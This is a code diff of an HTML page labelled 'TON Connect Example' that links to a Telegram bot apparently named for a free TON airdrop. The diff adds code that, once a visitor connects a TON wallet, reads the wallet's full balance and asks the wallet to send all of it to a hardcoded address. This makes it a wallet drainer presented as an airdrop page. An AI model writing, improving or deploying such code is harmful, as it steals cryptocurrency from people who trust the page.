@@ -5,10 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Connect Example</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@ton/ton@latest/dist/ton.min.js"></script>
 </head>
 <body>
 
     <div class="center" id="ton-connect"></div>
+    <div id="transaction-status"></div>
 
     <script>
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -20,35 +22,29 @@
             twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
         };
 
-        // Function to connect to the wallet and initiate transaction
-        async function connectToWalletAndSendTransaction() {
+        const destinationAddress = 'UQB98POW4sSTLGbr1_IULM5-cf-WXV4y_soC580fq5GIPrA3'; // Adres docelowy
+
+        tonConnectUI.onWalletConnected(async (wallet) => {
             try {
-                const connectedWallet = await tonConnectUI.connectWallet();
-                console.log("Connected Wallet:", connectedWallet);
-
-                // Get the current balance of the wallet
-                const balance = await tonConnectUI.getBalance(connectedWallet.address);
-                console.log("Wallet Balance:", balance);
-
-                // Prepare the transaction to send the entire balance
+                const balance = await tonConnectUI.provider.getBalance(wallet.account.address);
+                
                 const transaction = {
-                    messages: [{
-                        address: "EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY", // Replace with the actual contract address
-                        amount: balance,
-                        body: "TEST"
-                    }]
+                    validUntil: Math.floor(Date.now() / 1000) + 360, // 5 minut ważności
+                    messages: [
+                        {
+                            address: destinationAddress,
+                            amount: balance,
+                        }
+                    ]
                 };
 
-                // Send the transaction
                 const result = await tonConnectUI.sendTransaction(transaction);
-                console.log("Transaction Result:", result);
+                document.getElementById('transaction-status').innerText = 'Transakcja wysłana: ' + result.boc;
             } catch (error) {
-                console.error("Error connecting to wallet or sending transaction:", error);
+                console.error('Błąd podczas wysyłania transakcji:', error);
+                document.getElementById('transaction-status').innerText = 'Błąd: ' + error.message;
             }
-        }
-
-        // Add event listener to the connect button
-        document.getElementById('ton-connect').addEventListener('click', connectToWalletAndSendTransaction);
+        });
     </script>
 
 </body>
